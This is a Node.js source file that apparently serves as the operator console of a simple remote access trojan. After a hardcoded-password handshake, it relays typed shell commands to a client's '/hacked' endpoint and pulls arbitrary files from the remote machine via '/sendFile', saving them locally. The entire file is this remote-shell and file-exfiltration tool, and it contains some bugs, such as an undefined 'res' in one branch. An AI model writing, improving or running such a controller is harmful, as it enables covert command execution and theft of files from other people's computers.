import express, { urlencoded } from "express";
import bodyParser from "body-parser";
import axios from "axios";
import fs from 'fs';
import inquirer from "inquirer";




// const client_Url = "http://10.40.32.241:80";
const client_Url = "http://localhost:80";
const port = 3000;
const app = express();
let config = {
	headers:{
		"Content-Type":"application/x-www-form-urlencoded"
	}
}
let file=[0]
let dir="";
app.use(bodyParser.urlencoded({ extended: true }));

async	function  runCode(){
	const response = await axios.post(`${client_Url}/`, {
		passwd: "1234",
	},config);
	dir = response.data;
	console.log(dir)
	
}
console.log(dir)

const questions = [
	{
		type: "input",
		name: "entered-cmd",
		message: "Enter a cmd command, Type exit to end\n"+dir+": ",
	},
];

const commnds = [
	{
		type: "input",
		name: "cmd",
		message: "Enter 'help' to get or 'cmd' to get a terminal session: ",
	},
];
const cmdCommads = [
	{ 
		type: "input", 
		name: "path", 
		message: "Enter filepath" 
	},
];

let s = app.listen(port,async function () {
	console.log("Listening on port " + port);
	await runCode();
	let userInput={cmd:""};
	while(userInput.cmd.toLocaleLowerCase() !="exit"){
		userInput = await inquirer.prompt(commnds);
		switch (userInput.cmd.toLocaleLowerCase()) {
			case "help":
				console.log("More commands will be added later\n1)Send File");
				break;
			case "1":
				let filepath= await inquirer.prompt(cmdCommads);
				res.send(filepath);
				break;
			case "2":
				let filepath1 = await inquirer.prompt(cmdCommads);
				let r = await axios.post(
					client_Url + "/sendFile",
					{ path: filepath1.path },
					config
				);
				// console.log(r);
				let num= file[file.length-1];
				fs.appendFile("./file" + num + ".txt", r.data, function (err) {
					if (err) throw err;
					console.log("saved");
					file.push(++num);
				});
				// continue
				break;
				
			case "cmd":
				let cmd = "";
				while (true) {
					let res = await inquirer.prompt(questions);
					cmd = res["entered-cmd"];
					console.log(cmd);
					if (cmd.toLocaleLowerCase() == "exit") {
						// s.close();
						break;
					} else {
						let r = await axios.post(
							client_Url + "/hacked",
							{ commands: cmd },
							config
						);
						console.log(r.data);
					}
				}
				break;
			default:
				console.log("Session ended")
				break;
		}

	}
	s.close();
});
